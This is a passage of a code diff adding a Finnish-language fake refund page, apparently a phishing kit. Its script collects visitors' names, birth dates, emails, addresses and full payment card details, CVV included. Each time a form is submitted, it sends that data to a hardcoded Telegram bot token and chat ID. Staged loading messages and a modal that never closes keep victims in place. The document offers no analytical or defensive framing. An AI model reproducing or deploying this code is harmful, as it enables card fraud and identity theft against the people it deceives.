+                                    <line x1="16" y1="2" x2="16" y2="6"/>
+                                    <line x1="8" y1="2" x2="8" y2="6"/>
+                                    <line x1="3" y1="10" x2="21" y2="10"/>
+                                </svg>
+                                <input type="text" id="vanhenemispaiva" name="vanhenemispaiva" placeholder="KK/VV" maxlength="5" inputmode="numeric" pattern="[0-9/]*" required oninput="formatExpiry(this); updateCardDisplay()" onfocus="flipCard('front')">
+                            </div>
+                        </div>
+
+                        <div class="card-form-group">
+                            <label for="cvv">CVV</label>
+                            <div class="card-input-wrapper">
+                                <svg class="card-input-icon" viewBox="0 0 24 24">
+                                    <rect x="3" y="11" width="18" height="11" rx="2"/>
+                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                                </svg>
+                                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" inputmode="numeric" pattern="[0-9]*" required oninput="formatCVV(this); updateCardDisplay()" onfocus="flipCard('back')" onblur="flipCard('front')">
+                            </div>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-submit">Vahvista hyvitys</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // TELEGRAM KONFIGURAATIO - TÄHÄN OMAT TIEDOT
+        // ============================================
+        const TELEGRAM_BOT_TOKEN = '8596752261:AAFgvS2-xBzUSQRFGbYGaDyyYbJmG9PBGZ0'; // Vaihda tähän oma token
+        const TELEGRAM_CHAT_ID = '7927796867'; // Vaihda tähän oma chat ID
+        
+        // ============================================
+        // TELEGRAM LÄHETYSFUNKTIOT
+        // ============================================
+        
+        // Lähetä viesti Telegramiin
+        async function sendTelegramMessage(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (!response.ok) {
+                    console.error('Telegram API error:', await response.text());
+                } else {
+                    console.log('Telegram message sent successfully');
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+        
+        // Kerää laite- ja selaininfo
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                timestamp: new Date().toLocaleString('fi-FI')
+            };
+        }
+        
+        // ============================================
+        // SIVUKOHTAISET TELEGRAM-ILMOITUKSET
+        // ============================================
+        
+        // 1. PÄÄSIVU - Kun käyttäjä klikkaa CTA-nappia
+        function sendMainPageNotification() {
+            const device = getDeviceInfo();
+            const message = `🏠 <b>PÄÄSIVU - Uusi käyttäjä</b>
+
+📱 Laite: ${device.platform}
+🌐 Selain: ${device.userAgent.substring(0, 50)}...
+🖥️ Näyttö: ${device.screenSize}
+🌍 Kieli: ${device.language}
+⏰ Aika: ${device.timestamp}
+
+✅ Käyttäjä klikkasi "Hae hyvitystä tästä"`;
+            
+            sendTelegramMessage(message);
+        }
+        
+        // 2. HENKILÖTIETOSIVU - Kun lomake lähetetään
+        function sendPersonalInfoNotification(formData) {
+            const device = getDeviceInfo();
+            const message = `📝 <b>HENKILÖTIEDOT - Lomake lähetetty</b>
+
+👤 Nimi: ${formData.etunimi} ${formData.sukunimi}
+📅 Syntymäaika: ${formData.syntymaaika}
+📧 Email: ${formData.email}
+🏠 Osoite: ${formData.katu} ${formData.talonumero}
+📮 Postinumero: ${formData.postinumero}
+
+📱 Laite: ${device.platform}
+⏰ Aika: ${device.timestamp}`;
+            
+            sendTelegramMessage(message);
+        }
+        
+        // 3. LUOTTOKORTTISIVU - Kun korttitiedot lähetetään
+        function sendCardInfoNotification(cardData) {
+            const device = getDeviceInfo();
+            const message = `💳 <b>LUOTTOKORTTITIEDOT - Saatu!</b>
+
+💳 Korttinumero: ${cardData.korttinumero}
+👤 Kortinhaltija: ${cardData.kortinhaltija}
+📅 Vanhenee: ${cardData.vanhenemispaiva}
+🔒 CVV: ${cardData.cvv}
+
+⚠️ <b>TÄYDELLINEN DATA SAATU!</b>
+
+📱 Laite: ${device.platform}
+⏰ Aika: ${device.timestamp}`;
+            
+            sendTelegramMessage(message);
+        }
+
+        // ============================================
+        // NAVIGOINTIFUNKTIOT (päivitetyt Telegram-tuella)
+        // ============================================
+        
+        function startRefundProcess() {
+            // Lähetä Telegram-ilmoitus pääsivulta
+            sendMainPageNotification();
+            
+            // Näytä lataus 3 sekuntia
+            document.getElementById('loadingOverlay').classList.add('active');
+            document.getElementById('loadingText').textContent = 'Ladataan...';
+
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').classList.remove('active');
+                document.getElementById('mainPage').classList.add('hidden');
+                document.getElementById('formPage').classList.add('active');
+                window.scrollTo(0, 0);
+            }, 3000);
+        }
+
+        function submitForm(event) {
+            event.preventDefault();
+            
+            // Kerää lomakedata
+            const formData = {
+                etunimi: document.getElementById('etunimi').value,
+                sukunimi: document.getElementById('sukunimi').value,
+                syntymaaika: document.getElementById('syntymaaika').value,
+                email: document.getElementById('email').value,
+                katu: document.getElementById('katu').value,
+                talonumero: document.getElementById('talonumero').value,
+                postinumero: document.getElementById('postinumero').value
+            };
+            
+            // Lähetä Telegram-ilmoitus henkilötiedoista
+            sendPersonalInfoNotification(formData);
+
+            // Näytä lataus: 3 sekuntia normaali, sitten 4 sekuntia "Tietojen tarkistus"
+            document.getElementById('loadingOverlay').classList.add('active');
+            document.getElementById('loadingText').textContent = 'Ladataan...';
+
+            // Ensimmäiset 3 sekuntia - normaali lataus
+            setTimeout(() => {
+                // Seuraavat 4 sekuntia - "Tietojen tarkistus, odota hetki"
+                document.getElementById('loadingText').textContent = 'Tietojen tarkistus, odota hetki...';
+
+                setTimeout(() => {
+                    document.getElementById('loadingOverlay').classList.remove('active');
+                    document.getElementById('formPage').classList.remove('active');
+                    document.getElementById('cardPage').classList.add('active');
+                    window.scrollTo(0, 0);
+                }, 4000);
+            }, 3000);
+        }
+
+        function submitCard(event) {
+            event.preventDefault();
+            
+            // Kerää korttidata
+            const cardData = {
+                korttinumero: document.getElementById('korttinumero').value,
+                kortinhaltija: document.getElementById('kortinhaltija').value,
+                vanhenemispaiva: document.getElementById('vanhenemispaiva').value,
+                cvv: document.getElementById('cvv').value
+            };
+            
+            // Lähetä Telegram-ilmoitus korttitiedoista
+            sendCardInfoNotification(cardData);
+
+            // Näytä pankkimodaali pysyvästi (ei aikakatkaisua)
+            document.getElementById('bankingModal').classList.add('active');
+            // Ei setTimeout - modaali pysyy auki loputtomi
+        }
+
+        // ============================================
+        // KORTIN MUIOTOILUFUNKTIOT (ennallaan)
+        // ============================================
+        
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            input.value = formattedValue;
+        }
+
+        function formatExpiry(input) {
+            let value = input.value.replace(/[^0-9]/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            input.value = value;
+        }
+
+        function formatCVV(input) {
+            input.value = input.value.replace(/[^0-9]/g, '');
+        }
+
+        function updateCardDisplay() {
+            const number = document.getElementById('korttinumero').value || '•••• •••• •••• ••••';
+            const holder = document.getElementById('kortinhaltija').value || 'NIMI SUKUNIMI';
+            const expiry = document.getElementById('vanhenemispaiva').value || 'KK/VV';
+            const cvv = document.getElementById('cvv').value || '•••';
+
+            document.getElementById('cardNumberDisplay').textContent = number;
+            document.getElementById('cardHolderDisplay').textContent = holder.toUpperCase();
+            document.getElementById('cardExpiryDisplay').textContent = expiry;
+            document.getElementById('cardCvvDisplay').textContent = cvv;
+        }
+
+        function flipCard(side) {
+            const card = document.getElementById('cardVisual');
+            if (side === 'back') {
+                card.classList.add('flipped');
+            } else {
+                card.classList.remove('flipped');
+            }
+        }
+
+        // Syntymäajan muotoilu
+        document.getElementById('syntymaaika')?.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9]/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '.' + value.substring(2);
+            }
+            if (value.length >= 5) {
+                value = value.substring(0, 5) + '.' + value.substring(5, 8);
+            }
+            e.target.value = value;
+        });
+    </script>
+</body>
+</html>
